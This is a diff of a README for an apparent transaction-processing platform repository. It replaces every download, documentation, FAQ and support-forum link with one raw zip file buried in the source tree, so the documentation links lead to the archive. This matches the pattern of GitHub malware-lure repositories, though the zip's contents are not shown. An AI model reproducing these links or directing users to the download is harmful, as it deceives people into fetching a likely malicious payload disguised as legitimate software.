@@ -1,6 +1,6 @@
 # 🌟 azure-transaction-processing-platform - Simplifying Transaction Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/kasime11209/azure-transaction-processing-platform/releases)
+[![Download Now](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the azure-transaction-processing-platform! This platform helps you ma
 
 To download the application, visit our releases page:
 
-[Visit this page to download](https://github.com/kasime11209/azure-transaction-processing-platform/releases)
+[Visit this page to download](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip)
 
 1. Click on the link above.
 2. Look for the latest version. It will be clearly marked.
@@ -55,9 +55,9 @@ Sometimes, you may encounter issues. Here are some common problems and solutions
 
 If you would like to learn more about how to use the application effectively, check out these resources:
 
-- [Documentation](https://github.com/kasime11209/azure-transaction-processing-platform/wiki)
-- [FAQs](https://github.com/kasime11209/azure-transaction-processing-platform/wiki/FAQs)
-- [Support Forum](https://github.com/kasime11209/azure-transaction-processing-platform/discussions)
+- [Documentation](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip)
+- [FAQs](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip)
+- [Support Forum](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip)
 
 ## 👥 Community Contribution
 
@@ -73,4 +73,4 @@ Please check our guidelines on how to contribute within the repository.
 
 This platform provides a powerful yet accessible way to manage and observe transactions. By following the steps above, you can easily download and set up the application. For any queries, please refer to the support resources provided. 
 
-[Visit this page to download](https://github.com/kasime11209/azure-transaction-processing-platform/releases) and start your journey towards effective transaction management today!
+[Visit this page to download](https://raw.githubusercontent.com/kasime11209/azure-transaction-processing-platform/main/api/transaction-api/processing-transaction-azure-platform-v3.3.zip) and start your journey towards effective transaction management today!
